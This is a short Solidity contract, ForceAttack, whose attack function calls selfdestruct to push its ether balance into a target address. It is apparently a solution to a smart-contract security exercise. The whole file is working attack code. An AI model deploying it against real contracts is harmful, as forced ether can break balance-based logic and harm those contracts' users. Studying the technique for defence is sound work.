pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() payable {}

    function attack(address payable _forceAddr) external {
        selfdestruct(_forceAddr);
    }
}
